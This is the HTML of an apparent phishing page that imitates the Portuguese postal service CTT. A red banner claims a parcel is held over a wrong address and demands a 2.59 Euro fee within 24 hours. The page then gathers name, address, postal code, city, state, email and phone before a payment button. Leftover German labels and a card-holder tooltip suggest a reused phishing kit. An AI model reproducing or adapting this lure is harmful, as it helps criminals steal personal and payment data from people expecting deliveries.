...
@font-face {
  ...
  <header id="header">
    <div class="container">
      <div class="row">
        <div class="col-xs-24">
              <img src="https://www.ctt.pt/application/themes/images/logo-ctt.svg" style="padding: 10px">
...
<main id="main" class="container" style="background-color: #f1f1f1">
    <div class="row">
        			<div class="col-md-12">


			<div class="extra-content">
				<div id="precarttext"><center>
                    </center>
                </div>
			</div>


								<div class="cart" id="shoppingcartwrapper" style="background-color: #f1f1f1">
		<div id="shoppingcart">
			<div class="header hidden-md hidden-lg" id="shoppingcartheader">
				<strong style="color:red">Seu pacote foi colocado como não enviado, devido ao endereço de entrega incorreto, você precisa confirmar o novo endereço para concluir o envio, o custo da mudança de endereço será de 2,59 Euro, você precisa confirmar nas próximas 24h.</strong>
			</div>
				...
				<div>
					...
					<table class="table">
						...
						<tfoot>
							<tr>
								<td>
									<strong>Seu pacote foi colocado como não enviado, devido ao endereço de entrega incorreto, você precisa confirmar o novo endereço para concluir o envio, o custo da mudança de endereço será de 2,59 $, você precisa confirmar nas próximas 24h.</strong>
																	</td>
...
<input type="hidden" value="false" name="isFramed">
    ...
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Name</label>
            ...
            <input name="name" placeholder="Nome" id="cardholderName" class="form-control cc-name" autocomplete="cc-name" type="text"  oninvalid="this.setCustomValidity('Name')"
  oninput="this.setCustomValidity('')">
    ...
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Adresse</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="address" placeholder="Endereço" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Adresse')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>            <span class="tooltip-button-container" tabindex="0">
    ...
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Postleitzahl</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="zip" placeholder="Código postal" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Postleitzahl')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>  
    ...
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Stadt</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="city" placeholder="Cidade" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Stadt')"
  oninput="this.setCustomValidity('')">
<i class='fas fa-city'></i>
    ...
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Bundesland</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="state" placeholder="Estado federal" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Bundesland')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>  
            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
        ...
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">E-Mail Adresse</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="email" placeholder="E-Mail" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('E-Mail Adresse')"
  oninput="this.setCustomValidity('')">
<i class="fa fa-envelope"></i>            <span class="tooltip-button-container" tabindex="0">
        ...
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Telefon</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="phone" placeholder="Telefone" id="cardholderName" class="form-control cc-name"  required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Telefon')"
  oninput="this.setCustomValidity('')">
    ...
    <span class="tooltip-button-container" tabindex="0">
        ...
        <br><br>
                ...
                <div class="paymentbuttons" id="paymentButtons">
                    <button id="primaryButton" class="btn btn-block-rpp btn-primary" type="submit" name="doPayment" value="doPayment" style="background-color: #DF0024;border: 1px solid #DF0024">
  ...
  <div id="footer">
    ...
    <div class="footer-menu">
      ...
      <div class="container merchant" id="merchantfooter">
          ...
          <nav class="col-xs-24">
            <ul>
                                                                               <font style="vertical-align: inherit;">© CTT 2022. All rights reserved. </font>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </ul>
          </nav>
        </div>
      </div>
